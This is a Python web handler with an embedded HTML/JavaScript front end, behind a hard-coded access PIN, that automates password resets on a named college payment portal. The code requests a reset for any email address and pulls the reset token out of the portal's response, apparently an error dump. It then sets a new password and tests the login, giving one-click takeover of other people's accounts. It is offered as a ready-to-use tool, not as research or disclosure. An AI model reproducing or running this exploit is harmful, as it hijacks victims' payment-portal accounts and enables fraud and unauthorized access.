from http.server import BaseHTTPRequestHandler
import json, os, re, requests
from urllib.parse import parse_qs

ACCESS_PIN = os.environ.get("ACCESS_PIN", "9712")
APP_VERSION = os.environ.get("APP_VERSION", "2.1.0")
APP_CHANGELOG = "OTA update checker, version banner, force refresh"
BASE_URL = "https://payment.vaccdharampur.org"

HTML = r'''<!DOCTYPE html>
<html lang="hi" data-theme="light">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Password Reset · Vanraj</title>
<style>
:root,[data-theme=light]{--p:#2563eb;--ph:#1d4ed8;--bg:#f1f5f9;--card:#fff;--t:#0f172a;--m:#64748b;--b:#e2e8f0;--ok:#dcfce7;--okt:#166534;--err:#fee2e2;--errt:#991b1b;--note:#f8fafc;--in:#fff}
[data-theme=dark]{--p:#3b82f6;--ph:#60a5fa;--bg:#0f172a;--card:#1e293b;--t:#f1f5f9;--m:#94a3b8;--b:#334155;--ok:#14532d;--okt:#bbf7d0;--err:#7f1d1d;--errt:#fecaca;--note:#0f172a;--in:#0f172a}
*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui,sans-serif;background:var(--bg);min-height:100vh;display:grid;place-items:center;padding:1.25rem;color:var(--t)}
.card{background:var(--card);width:100%;max-width:440px;padding:2rem;border-radius:16px;border:1px solid var(--b);box-shadow:0 8px 30px rgba(0,0,0,.12)}
.top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:1.2rem;gap:1rem}
h1{font-size:1.3rem}.sub{color:var(--m);font-size:.85rem;margin-top:.2rem}.ver{font-size:.7rem;color:var(--m);margin-top:.15rem}
.icon{background:var(--note);border:1px solid var(--b);color:var(--t);border-radius:10px;padding:.45rem .65rem;cursor:pointer}
label{display:block;font-size:.81rem;font-weight:500;margin:1rem 0 .4rem}
input{width:100%;padding:.75rem .9rem;border:1px solid var(--b);border-radius:12px;background:var(--in);color:var(--t);font-size:.95rem}
input:focus{outline:none;border-color:var(--p)}input.filled{border-color:#22c55e}
.row{display:flex;gap:.5rem}.row input{flex:1;min-width:0}
button{padding:.7rem 1rem;background:var(--p);color:#fff;border:none;border-radius:12px;font-weight:600;cursor:pointer;font-size:.875rem}
button:hover{background:var(--ph)}button:disabled{opacity:.65}
button.sec{background:transparent;color:var(--t);border:1px solid var(--b)}
button.full{width:100%;margin-top:1.25rem;padding:.9rem;font-size:1rem}
button.ghost{width:100%;margin-top:.6rem;padding:.7rem;font-size:.85rem;background:transparent;color:var(--m);border:1px dashed var(--b)}
button.okb{background:#16a34a;margin-top:.6rem}button.link{background:#0f766e;margin-top:.6rem}
#adv{display:none}#adv.open{display:block}
#res{display:none;margin-top:1.25rem;padding:.9rem 1rem;border-radius:12px;font-size:.875rem;word-break:break-all}
.ok{background:var(--ok);color:var(--okt)}.err{background:var(--err);color:var(--errt)}
.note{margin-top:1.25rem;padding:.85rem;background:var(--note);border-radius:10px;font-size:.78rem;color:var(--m);border:1px solid var(--b);line-height:1.5}
.steps{display:flex;gap:.4rem;margin:1rem 0;font-size:.75rem;color:var(--m)}
.steps span{flex:1;text-align:center;padding:.35rem;border-radius:8px;background:var(--note);border:1px solid var(--b)}
.steps span.active{color:var(--p);border-color:var(--p);font-weight:600}.steps span.done{color:#22c55e;border-color:#22c55e}
.prog{display:none;margin-top:1rem}.prog.show{display:block}
.prog-l{font-size:.8rem;color:var(--m);margin-bottom:.4rem;display:flex;justify-content:space-between}
.track{height:8px;background:var(--b);border-radius:99px;overflow:hidden}.fill{height:100%;width:0;background:var(--p);border-radius:99px;transition:width .35s}
#gate{position:fixed;inset:0;z-index:10000;background:var(--bg);display:grid;place-items:center;padding:1.25rem}
#gate.hidden,#app.hidden{display:none}.pin-card{text-align:center}
.pin-card input{text-align:center;letter-spacing:.35em;font-size:1.25rem;font-weight:600}
#pinErr{color:var(--errt);font-size:.85rem;margin-top:.75rem;min-height:1.2em}
#toasts{position:fixed;top:1rem;right:1rem;z-index:9999;display:flex;flex-direction:column;gap:.5rem;max-width:min(360px,92vw)}
.toast{background:#0f172a;color:#f8fafc;padding:.85rem 1rem;border-radius:12px;font-size:.875rem;border-left:4px solid var(--p)}
.toast.ok{border-left-color:#22c55e}.toast.err{border-left-color:#ef4444}
#ota{display:none;position:fixed;top:0;left:0;right:0;z-index:10001;background:linear-gradient(90deg,#1d4ed8,#2563eb);color:#fff;padding:.75rem 1rem;text-align:center;font-size:.875rem;align-items:center;justify-content:center;gap:.75rem;flex-wrap:wrap;box-shadow:0 4px 20px rgba(37,99,235,.35)}
#ota.show{display:flex}#ota button{background:#fff;color:#1d4ed8;border:none;padding:.4rem .9rem;border-radius:8px;font-weight:700;cursor:pointer;font-size:.8rem}
#ota .later{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.5)}
</style></head>
<body>
<div id="toasts"></div>
<div id="ota"><span>🔄 Naya update available (v<span id="otaNew"></span>)</span><span style="opacity:.85;font-size:.75rem">Current: v<span id="otaCur"></span></span>
<button type="button" id="otaGo">Update Now</button><button type="button" class="later" id="otaLater">Later</button></div>
<div id="gate"><div class="card pin-card"><h1>Access PIN</h1><p class="sub">Tool use karne ke liye PIN daalo</p>
<input id="pinInput" type="password" inputmode="numeric" maxlength="8" placeholder="••••" autocomplete="off">
<button class="full" id="pinBtn" style="margin-top:1rem">Unlock</button><div id="pinErr"></div>
<div class="note" style="margin-top:1.25rem;text-align:left">Sirf authorized users. Galat PIN pe API block.</div></div></div>
<div id="app" class="hidden"><div class="card">
<div class="top"><div><h1>Password Reset</h1><p class="sub">Vanraj College Payment Portal</p>
<p class="ver">v<span id="verL">2.1.0</span> · <a href="#" id="chkUp" style="color:inherit">Check update</a></p></div>
<div style="display:flex;gap:.4rem">
<button type="button" class="icon" id="otaBtn" title="Check updates">🔄</button>
<button type="button" class="icon" id="lockBtn">🔒</button>
<button type="button" class="icon" id="soundBtn">🔊</button>
<button type="button" class="icon" id="themeBtn">🌙</button></div></div>
<div class="steps"><span id="s1">1. Email</span><span id="s2">2. Token</span><span id="s3">3. Done</span></div>
<label for="email">Email</label><input id="email" type="email" placeholder="registered@email.com">
<label for="password">New Password</label><input id="password" type="password" placeholder="min 6 characters">
<div class="prog" id="prog"><div class="prog-l"><span id="progT">Working...</span><span id="progP">0%</span></div><div class="track"><div class="fill" id="fill"></div></div></div>
<button class="full" id="oneBtn">One-Click Reset</button>
<button class="full okb" id="testBtn" style="display:none">Test Login</button>
<button class="full link" id="openBtn" style="display:none">Open Login Page ↗</button>
<button type="button" class="ghost" id="togAdv">Advanced: manual token ▾</button>
<div id="adv"><label for="token">Reset Token</label><div class="row">
<input id="token" type="text" placeholder="auto or paste"><button type="button" class="sec" id="findBtn">Find</button></div>
<button class="full" id="manBtn" style="margin-top:.75rem">Reset with Token</button></div>
<div id="res"></div>
<div class="note"><b>One-Click:</b> Email + password → token + reset.<br>🔄 OTA update check. 🔒 lock. PIN required.</div>
</div></div>
<script>
const $=id=>document.getElementById(id), LOGIN='https://payment.vaccdharampur.org/login', PK='tool_unlocked_v1';
const CLIENT_BUILD='2.1.0';
let pin=sessionStorage.getItem('access_pin')||'', last='', sound=localStorage.getItem('sound')!=='off', serverVer=CLIENT_BUILD;
const unlocked=()=>sessionStorage.getItem(PK)==='1'&&pin;
const unlock=()=>{$('gate').classList.add('hidden');$('app').classList.remove('hidden')};
const lock=()=>{sessionStorage.removeItem(PK);sessionStorage.removeItem('access_pin');pin='';$('app').classList.add('hidden');$('gate').classList.remove('hidden');$('pinInput').value='';$('pinErr').textContent='';$('pinInput').focus()};
async function api(body,skip){if(!skip)body=Object.assign({pin},body);const c=new AbortController(),t=setTimeout(()=>c.abort(),45000);
try{const r=await fetch('/',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body),signal:c.signal});const d=await r.json();if(d&&d.code==='UNAUTHORIZED'){lock();throw new Error(d.message||'Unauthorized')}return d}finally{clearTimeout(t)}}
function applyUpdate(){const u=new URL(location.href);u.searchParams.set('_v',Date.now());location.replace(u.toString())}
async function checkOta(silent){try{const d=await api({action:'version'},true);if(!d||!d.version)return;serverVer=d.version;$('verL').textContent=CLIENT_BUILD;
if(d.version!==CLIENT_BUILD){$('otaNew').textContent=d.version;$('otaCur').textContent=CLIENT_BUILD;if(localStorage.getItem('ota_dismissed')!==d.version)$('ota').classList.add('show');if(!silent)toast('Update available: v'+d.version,true)}
else{localStorage.setItem('app_version_seen',d.version);if(!silent)toast('Up to date (v'+d.version+')',true)}}catch(e){if(!silent)toast('Update check fail',false)}}
$('otaGo').onclick=applyUpdate;$('otaLater').onclick=()=>{localStorage.setItem('ota_dismissed',serverVer);$('ota').classList.remove('show')};
$('otaBtn').onclick=()=>checkOta(false);$('chkUp').onclick=e=>{e.preventDefault();checkOta(false)};
setTimeout(()=>checkOta(true),800);setInterval(()=>checkOta(true),300000);
async function tryUnlock(){const p=$('pinInput').value.trim();if(!p){$('pinErr').textContent='PIN daalo';return}$('pinBtn').disabled=true;
try{const d=await api({action:'verify_pin',pin:p},true);if(d.success){pin=p;sessionStorage.setItem(PK,'1');sessionStorage.setItem('access_pin',p);unlock();toast('Unlocked',true)}else{$('pinErr').textContent=d.message||'Galat PIN';play(false)}}catch(e){$('pinErr').textContent=e.message}$('pinBtn').disabled=false}
if(unlocked())unlock();else setTimeout(()=>$('pinInput').focus(),100);
$('pinBtn').onclick=tryUnlock;$('pinInput').onkeydown=e=>{if(e.key==='Enter')tryUnlock()};$('lockBtn').onclick=lock;
(function(){const s=localStorage.getItem('theme')||'light';document.documentElement.setAttribute('data-theme',s);$('themeBtn').textContent=s==='dark'?'☀️':'🌙'})();
$('themeBtn').onclick=()=>{const n=document.documentElement.getAttribute('data-theme')==='dark'?'light':'dark';document.documentElement.setAttribute('data-theme',n);localStorage.setItem('theme',n);$('themeBtn').textContent=n==='dark'?'☀️':'🌙'};
$('soundBtn').textContent=sound?'🔊':'🔇';$('soundBtn').onclick=()=>{sound=!sound;localStorage.setItem('sound',sound?'on':'off');$('soundBtn').textContent=sound?'🔊':'🔇';if(sound)play(true)};
let actx=null;function play(ok){if(!sound)return;try{if(!actx)actx=new(window.AudioContext||window.webkitAudioContext);const n=actx.currentTime,g=actx.createGain();g.connect(actx.destination);g.gain.setValueAtTime(0.0001,n);g.gain.exponentialRampToValueAtTime(0.15,n+0.02);if(ok){[523,659].forEach((f,i)=>{const o=actx.createOscillator();o.type='sine';o.frequency.value=f;o.connect(g);o.start(n+i*0.12);o.stop(n+i*0.12+0.12)});g.gain.exponentialRampToValueAtTime(0.0001,n+0.35)}else{const o=actx.createOscillator();o.type='square';o.frequency.value=180;o.connect(g);o.start(n);o.stop(n+0.22);g.gain.exponentialRampToValueAtTime(0.0001,n+0.25)}}catch(e){}}
function toast(m,ok){const el=document.createElement('div');el.className='toast '+(ok?'ok':'err');el.textContent=m;$('toasts').appendChild(el);setTimeout(()=>el.remove(),3500)}
function show(m,ok){const r=$('res');r.style.display='block';r.className=ok?'ok':'err';r.textContent=m;toast(m.slice(0,80),ok);play(!!ok)}
function prog(t,p,ind){$('prog').classList.add('show');$('progT').textContent=t;if(ind){$('progP').textContent='';$('fill').style.width='40%'}else{$('fill').style.width=p+'%';$('progP').textContent=Math.round(p)+'%'}}
function progHide(){$('prog').classList.remove('show');$('fill').style.width='0'}
function step(n){[1,2,3].forEach(i=>{const e=$('s'+i);e.classList.remove('active','done');if(i<n)e.classList.add('done');if(i===n)e.classList.add('active')})}
function successUI(){$('testBtn').style.display='block';$('openBtn').style.display='block'}
function busy(b){['oneBtn','findBtn','manBtn','testBtn','openBtn'].forEach(id=>{const e=$(id);if(e)e.disabled=b})}
$('togAdv').onclick=()=>{const o=$('adv').classList.toggle('open');$('togAdv').textContent=o?'Advanced: manual token ▴':'Advanced: manual token ▾'};
$('openBtn').onclick=()=>window.open(LOGIN,'_blank','noopener');
async function findOnly(){const email=$('email').value.trim();if(!email)return show('Email dalo',false);busy(true);step(2);prog('Finding token...',30,true);
try{const d=await api({action:'find_token',email});if(d.success&&d.token){$('token').value=d.token;$('token').classList.add('filled');prog('OK',100,false);show('Token mil gaya',true)}else show(d.message||'Token nahi mila',false)}catch(e){show(e.message,false)}setTimeout(progHide,600);busy(false)}
async function resetTok(){const email=$('email').value.trim(),token=$('token').value.trim(),password=$('password').value.trim();
if(!email||!token||!password)return show('Sab fields required',false);if(password.length<6)return show('Min 6 chars',false);
busy(true);prog('Resetting...',50,true);try{const d=await api({action:'reset',email,token,password});prog(d.success?'Done':'Fail',100,false);if(d.success){step(3);last=password;successUI()}show(d.message,!!d.success)}catch(e){show(e.message,false)}setTimeout(progHide,600);busy(false)}
async function oneClick(){const email=$('email').value.trim(),password=$('password').value.trim();
if(!email||!password)return show('Email + password',false);if(password.length<6)return show('Min 6 chars',false);
busy(true);$('testBtn').style.display='none';$('openBtn').style.display='none';try{step(2);prog('1/2 Token...',20,false);
const f=await api({action:'find_token',email});if(!f.success||!f.token){prog('Fail',100,false);show(f.message||'No token',false);return}
$('token').value=f.token;$('token').classList.add('filled');prog('2/2 Reset...',60,false);
const d=await api({action:'reset',email,token:f.token,password});prog(d.success?'Complete':'Fail',100,false);if(d.success){step(3);last=password;successUI()}show(d.message,!!d.success)}catch(e){show(e.name==='AbortError'?'Timeout':e.message,false)}finally{setTimeout(progHide,800);busy(false)}}
async function testLogin(){const email=$('email').value.trim(),password=$('password').value.trim()||last;if(!email||!password)return show('Email+password',false);
busy(true);prog('Login test...',40,true);try{const d=await api({action:'test_login',email,password});prog(d.success?'OK':'Fail',100,false);show(d.message,!!d.success);if(d.success)$('openBtn').style.display='block'}catch(e){show(e.message,false)}setTimeout(progHide,600);busy(false)}
step(1);$('findBtn').onclick=findOnly;$('manBtn').onclick=resetTok;$('oneBtn').onclick=oneClick;$('testBtn').onclick=testLogin;
document.addEventListener('keydown',e=>{if(e.key==='Enter'&&unlocked())oneClick()});
</script></body></html>'''

def check_pin(pin):
    return (pin or "").strip() == ACCESS_PIN

def find_token(email):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    r = s.get(f"{BASE_URL}/password/reset", timeout=20)
    if r.status_code != 200:
        return {"success": False, "message": f"Reset page fail ({r.status_code})"}
    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        return {"success": False, "message": "CSRF nahi mila"}
    post = s.post(f"{BASE_URL}/password/email", data={"_token": m.group(1), "email": email},
                  headers={"Referer": f"{BASE_URL}/password/reset", "Origin": BASE_URL}, timeout=25)
    tokens = re.findall(r"password/reset/([a-f0-9]{40,})", post.text, re.I)
    if tokens:
        return {"success": True, "token": tokens[0], "message": "Token mil gaya",
                "reset_url": f"{BASE_URL}/password/reset/{tokens[0]}"}
    t = post.text.lower()
    if "no valid recipients" in t or "swift_" in t:
        return {"success": False, "message": "SMTP error, token extract nahi hua. Dobara try karo."}
    return {"success": False, "message": f"Token nahi mila (HTTP {post.status_code})."}

def reset_password(email, token, password):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    url = f"{BASE_URL}/password/reset/{token}"
    resp = s.get(url, timeout=15)
    if resp.status_code != 200:
        raise Exception(f"Reset page fail ({resp.status_code})")
    csrf = None
    if 'name="_token"' in resp.text:
        a = resp.text.find('name="_token" value="') + len('name="_token" value="')
        csrf = resp.text[a:resp.text.find('"', a)]
    if not csrf:
        raise Exception("CSRF nahi mila")
    pr = s.post(f"{BASE_URL}/password/reset", data={
        "_token": csrf, "token": token, "email": email,
        "password": password, "password_confirmation": password
    }, headers={"Referer": url, "Origin": BASE_URL}, allow_redirects=True, timeout=15)
    tl, fu = pr.text.lower(), pr.url.lower().rstrip("/")
    ok = ("password has been reset" in tl or fu.endswith("/home") or "/home" in fu
          or fu.endswith("/login") or "/login" in fu or "/dashboard" in fu)
    if "/password/reset" in fu and ("invalid" in tl or "expired" in tl):
        ok = False
    if ok:
        msg = "Password reset successful! Test Login ya Open Login use karo."
    elif "can't find a user" in tl:
        msg = "Account nahi mila."
    elif "token" in tl and ("invalid" in tl or "expired" in tl):
        msg = "Token invalid/expire."
    else:
        msg = f"Reset fail. URL: {pr.url}"
    return {"success": ok, "message": msg, "final_url": pr.url}

def test_login(email, password):
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    r = s.get(f"{BASE_URL}/login", timeout=15)
    if r.status_code != 200:
        return {"success": False, "message": f"Login page fail ({r.status_code})"}
    m = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    if not m:
        return {"success": False, "message": "Login CSRF nahi mila"}
    post = s.post(f"{BASE_URL}/login", data={"_token": m.group(1), "email": email, "password": password},
                  headers={"Referer": f"{BASE_URL}/login", "Origin": BASE_URL}, allow_redirects=True, timeout=15)
    fu, tl = post.url.lower().rstrip("/"), post.text.lower()
    ok = fu.endswith("/home") or "/home" in fu or "/dashboard" in fu
    if "/login" in fu and ("credentials" in tl or "invalid" in tl or "incorrect" in tl):
        ok = False
    return {"success": ok, "message": "Login successful!" if ok else "Login fail.", "final_url": post.url}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(HTML.encode("utf-8"))

    def do_POST(self):
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n).decode("utf-8")
        try:
            data = json.loads(body)
        except Exception:
            data = parse_qs(body)
            data = {k: v[0] for k, v in data.items()}
        action = (data.get("action") or "reset").strip()
        pin = (data.get("pin") or "").strip()
        try:
            if action == "version":
                return self._json(200, {"success": True, "version": APP_VERSION, "changelog": APP_CHANGELOG})
            if action == "verify_pin":
                if check_pin(pin):
                    return self._json(200, {"success": True, "message": "OK"})
                return self._json(401, {"success": False, "message": "Galat PIN", "code": "UNAUTHORIZED"})
            if not check_pin(pin):
                return self._json(401, {"success": False, "message": "Access denied", "code": "UNAUTHORIZED"})
            email = (data.get("email") or "").strip()
            if action == "find_token":
                if not email:
                    return self._json(400, {"success": False, "message": "Email required"})
                return self._json(200, find_token(email))
            if action == "test_login":
                password = (data.get("password") or "").strip()
                if not email or not password:
                    return self._json(400, {"success": False, "message": "Email + password required"})
                return self._json(200, test_login(email, password))
            token = (data.get("token") or "").strip()
            password = (data.get("password") or "").strip()
            if not email or not token or not password:
                return self._json(400, {"success": False, "message": "Email, Token, Password required"})
            return self._json(200, reset_password(email, token, password))
        except Exception as e:
            return self._json(500, {"success": False, "message": f"Error: {e}"})

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json(self, status, data):
        self.send_response(status)
        self.send_header("Content-type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
